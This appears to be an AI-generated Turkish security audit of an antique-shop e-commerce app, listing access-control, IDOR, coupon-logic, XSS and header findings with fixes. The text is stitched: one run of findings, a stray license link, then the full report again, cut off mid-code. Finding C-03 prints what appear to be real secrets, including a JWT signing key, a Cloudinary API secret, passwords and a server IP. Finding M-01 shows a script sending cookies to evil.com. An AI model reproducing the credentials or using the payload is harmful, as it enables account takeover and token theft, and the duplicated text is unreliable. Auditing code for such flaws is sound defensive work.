**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
    }];
}
```


## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
